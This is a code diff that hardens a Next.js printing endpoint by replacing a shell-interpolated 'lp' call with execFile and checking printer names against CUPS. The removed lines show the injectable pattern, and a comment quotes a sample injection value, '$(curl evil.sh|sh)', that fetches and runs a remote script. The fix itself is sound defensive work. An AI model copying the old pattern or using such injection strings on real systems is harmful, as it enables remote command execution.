@@ -1,9 +1,51 @@
 import { NextRequest, NextResponse } from "next/server"
-import { exec } from "child_process"
-import { promisify } from "util"
+import { execFile as execFileCb } from "child_process"
 import { requireAdmin } from "@/lib/auth/api-auth"
 
-const execAsync = promisify(exec)
+// No `exec` import: every subprocess here goes through the execFile family,
+// so no command string is ever handed to a shell -- printer_name and zpl are
+// passed as an argv array / stdin, never interpolated into a shell string.
+// Mirrors the pattern in scripts/print-proxy.mjs (resolvePrinter/execFile).
+
+const DEFAULT_PRINTER = "Zebra_Technologies_ZTC_ZD230_203dpi_ZPL"
+
+function runLpstat(args: string[]): Promise<string> {
+  return new Promise((resolve) => {
+    execFileCb("lpstat", args, { encoding: "utf8", timeout: 5000 }, (error, stdout) => {
+      resolve(error ? "" : stdout)
+    })
+  })
+}
+
+async function resolvePrinter(name: string | undefined): Promise<string | null> {
+  if (!name) return DEFAULT_PRINTER
+
+  // Requiring `name` to match a printer CUPS actually knows about is both the
+  // correct semantic check and what blocks injection -- a value like
+  // `$(curl evil.sh|sh)` simply never appears in lpstat's output.
+  const output = await runLpstat(["-p"])
+  const printers = output
+    .split("\n")
+    .map((line) => line.match(/^printer (\S+)/)?.[1])
+    .filter((p): p is string => !!p)
+
+  return printers.includes(name) ? name : null
+}
+
+function runLp(printerName: string, zpl: string): Promise<{ stdout: string; stderr: string }> {
+  return new Promise((resolve, reject) => {
+    const child = execFileCb(
+      "lp",
+      ["-d", printerName, "-o", "raw", "-"],
+      { timeout: 10000, encoding: "utf8" },
+      (error, stdout, stderr) => {
+        if (error) reject(Object.assign(error, { stderr }))
+        else resolve({ stdout, stderr })
+      }
+    )
+    child.stdin?.end(zpl)
+  })
+}
 
 // POST /api/local-print - Send ZPL to local USB Zebra printer
 export async function POST(request: NextRequest) {
@@ -13,7 +55,7 @@ export async function POST(request: NextRequest) {
 
     const { zpl, printer_name } = await request.json()
 
-    if (!zpl) {
+    if (!zpl || typeof zpl !== "string") {
       return NextResponse.json({ error: "ZPL data required" }, { status: 400 })
     }
 
@@ -38,14 +80,19 @@ export async function POST(request: NextRequest) {
       }
     }
 
-    // Default to Zebra printer when caller has not specified one and no proxy.
-    const printerName = printer_name || "Zebra_Technologies_ZTC_ZD230_203dpi_ZPL"
+    if (printer_name !== undefined && typeof printer_name !== "string") {
+      return NextResponse.json({ error: "printer_name must be a string" }, { status: 400 })
+    }
 
-    // Send ZPL to printer via lp command
-    const { stdout, stderr } = await execAsync(
-      `echo '${zpl.replace(/'/g, "\\'")}' | lp -d "${printerName}" -o raw -`,
-      { timeout: 10000 }
-    )
+    const printerName = await resolvePrinter(printer_name)
+    if (!printerName) {
+      return NextResponse.json(
+        { success: false, error: `Unknown printer: ${printer_name}` },
+        { status: 400 },
+      )
+    }
+
+    const { stdout } = await runLp(printerName, zpl)
 
     console.log("[Local Print] Sent to", printerName, stdout)
 
@@ -67,9 +114,10 @@ export async function POST(request: NextRequest) {
 // GET /api/local-print - Check printer status
 export async function GET() {
   try {
-    const { stdout } = await execAsync("lpstat -p -d 2>/dev/null | head -20")
+    const output = await runLpstat(["-p", "-d"])
 
-    const printers = stdout.split("\n")
+    const printers = output.split("\n")
+      .slice(0, 20)
       .filter(line => line.includes("printer "))
       .map(line => {
         const match = line.match(/printer (\S+) is (\w+)/)
